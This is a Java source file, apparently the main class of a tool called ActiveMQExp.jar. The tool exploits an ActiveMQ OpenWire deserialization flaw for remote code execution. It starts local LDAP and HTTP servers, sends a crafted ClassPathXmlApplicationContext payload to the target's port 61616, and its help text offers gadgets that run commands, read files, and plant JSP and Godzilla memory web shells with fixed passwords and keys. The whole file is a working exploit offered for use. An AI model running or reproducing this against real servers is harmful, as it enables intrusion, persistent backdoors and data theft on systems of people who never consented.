package sonomon;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.Socket;
import java.util.Arrays;
import java.util.List;

import com.sun.net.httpserver.HttpServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import sonomon.server.HTTPServer;
import sonomon.server.LdapServer;

public class Run {
	public static void getHelp() {

		System.out.println("��ȫ�汾>= 5.18.3/5.17.6/5.16.7");
		System.out.println("java -jar ActiveMQExp.jar rhost=rhost lhost=lhost gadget=gadget cmd=cmd");
		System.out.println("����");
		System.out.println("java -jar ActiveMQExp.jar rhost=127.0.0.1 lhost=127.0.0.1 gadget=cb19 cmd=whoami");
		System.out.println("Ĭ�� rport=61616 ldapport=1389 httpport=9998");
		System.out.println("Ŀǰ֧�ֵ�gadget����");
		System.out.println("gadget=wincmd cmd=whoami //�޻���");
		System.out.println("gadget=linuxcmd cmd=whoami //�޻���");
		System.out.println("gadget=spelcmd cmd=whoami //�޻���");
		System.out.println("gadget=spelecho cmd=whoami //�л��� from Hutt0n0");
		System.out.println("gadget=spelclass cmd=memcmd //�ڴ��� from Hutt0n0 http://rhost:8161/admin/memshell?cmd=whoami");
		System.out.println("gadget=spelclass cmd=memgodzilla //�ڴ��� http://rhost:8161/admin/memgodzilla pass:Tas9er key:B7VO2sAamj");
		System.out.println("gadget=spelclass cmd=readfile //��8186�˻����벢������һ��8186/admin/");
		System.out.println("gadget=spelclass cmd=whoami //�л���");
		System.out.println("gadget=spelclass cmd=cmdjsp // http://rhost:8161/api/cmd.jsp");
		System.out.println("gadget=spelclass cmd=godzillajsp // http://rhost:8161/api/godzillajsp pass:Tas9er key:B7VO2sAamj");
		System.out.println("gadget=urldns cmd=xxx.dnslog.cn");
		System.out.println("gadget=cb18 cmd=whoami //�л���");
		System.out.println("gadget=cb18 cmd=cmdjsp");
		System.out.println("gadget=cb18 cmd=godzillajsp");
		System.out.println("gadget=cb18 cmd=readfile");
		System.out.println("gadget=cb18 cmd=memgodzilla");
		System.out.println("gadget=cb19 cmd=whoami //�л���");
		System.out.println("gadget=cb19 cmd=cmdjsp");
		System.out.println("gadget=cb19 cmd=godzillajsp");
		System.out.println("gadget=cb19 cmd=readfile");
		System.out.println("gadget=cb19 cmd=memgodzilla");

	}
	//��ȫ�汾 >= 5.18.3/5.17.6/5.16.7  
	public static void main(String[] args) throws Exception {
		disableAccessWarnings();
		Config.setRhost("127.0.0.1");
		Config.setRport(61616);
		Config.setLhost("127.0.0.1");
		Config.setLdapport(1389);
		Config.setHttpport(9998);
		Config.setGadget("spelecho");
		Config.setCmd("whoami");
		
		int flag = 0;
		for (int i = 0; i < args.length; i++) {
			try {
				List list = Arrays.asList(args[i].split("\\="));
				String k = (String) list.get(0);
				String v = (String) list.get(1);
				String setter = "set"+Character.toUpperCase(k.charAt(0)) + k.substring(1);
				if (k.equals("rhost") || k.equals("lhost") || k.equals("gadget") || k.equals("cmd") ) {
					flag = flag + 1;
					Config.class.getMethod(setter, String.class).invoke(null, v);
				} else if (k.equals("web_user") || k.equals("web_pass") ) {
					Config.class.getMethod(setter, String.class).invoke(null, v);
				} else {
					Config.class.getMethod(setter, int.class).invoke(null, Integer.parseInt(v));
				}
			} catch (Exception e) {
				System.out.println("[-] ��������ʧ�� �ο�: java -jar ActiveMQExp.jar rhost=127.0.0.1 lhost=127.0.0.1 gadget=cb19 cmd=whoami");
	    		System.exit(0);
			}
		}
		
    	if (args.length >= 4 && flag >= 4){
    	} else {
    		getHelp();
    		System.exit(0);
		}

    	
		
		System.out.println("[+] ldap����������");
		InMemoryDirectoryServer ldapserver =  LdapServer.start();
		System.out.println("[+] ldap���������ɹ�");
		
		System.out.println("[+] http����������");
		HttpServer httpserver = HTTPServer.start();
		System.out.println("[+] http���������ɹ�");
		
		Thread.sleep(100);
		String cmdtmp = Config.cmd;
		if (Config.cmd.startsWith("mem")) {
			Config.setCmd("readfile");
			System.out.println("[+] �ڴ�����֮ǰ�ȶ�8161 web�˻�����");
			exp();
			Config.setCmd(cmdtmp);
			Thread.sleep(2000);
		}
		System.out.println("[+] ��ʼ����");
		exp();
		System.out.println("[+] �����ɹ�");
		
		Thread.sleep(2000);
		System.out.println("[+] ldap����ֹͣ��");
		ldapserver.shutDown(true);
		System.out.println("[+] ldap����ֹͣ�ɹ�");
		
		System.out.println("[+] http����ֹͣ��");
		httpserver.stop(0);
		System.out.println("[+] http����ֹͣ�ɹ�");
		System.exit(0);
	    }
		

	private static boolean exp() throws Exception {
        String pocxml= Config.url+Config.gadget+".xml";
        Socket sck = new Socket(Config.rhost, Config.rport);
        OutputStream os = sck.getOutputStream();
        DataOutputStream out = new DataOutputStream(os);
        out.writeInt(0);
        out.writeByte(31);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeBoolean(true);
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        out.writeBoolean(true);
        out.writeUTF(pocxml);
        if (Config.gadget.equals("spelecho")) {
            InputStream inputStream = sck.getInputStream();
            ByteArrayOutputStream byteArrayOutputStream  = new ByteArrayOutputStream();
            int read;
            while ((read = inputStream.read()) != -1){
                byteArrayOutputStream.write(read);
            }
            System.out.println("[*] ���ض�ջ����: "+new String(byteArrayOutputStream.toByteArray()));
		}
        Thread.sleep(100);
        //call org.apache.activemq.openwire.v1.BaseDataStreamMarshaller#createThrowable cause rce
        out.close();
        os.close();
        sck.close();
        return true;
	}
	
	
	
    @SuppressWarnings("unchecked")
    public static void disableAccessWarnings() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field field = unsafeClass.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Object unsafe = field.get(null);
 
            Method putObjectVolatile =
                unsafeClass.getDeclaredMethod("putObjectVolatile", Object.class, long.class, Object.class);
            Method staticFieldOffset = unsafeClass.getDeclaredMethod("staticFieldOffset", Field.class);
 
            Class loggerClass = Class.forName("jdk.internal.module.IllegalAccessLogger");
            Field loggerField = loggerClass.getDeclaredField("logger");
            Long offset = (Long)staticFieldOffset.invoke(unsafe, loggerField);
            putObjectVolatile.invoke(unsafe, loggerClass, offset, null);
        } catch (Exception ignored) {
        }
    }
}
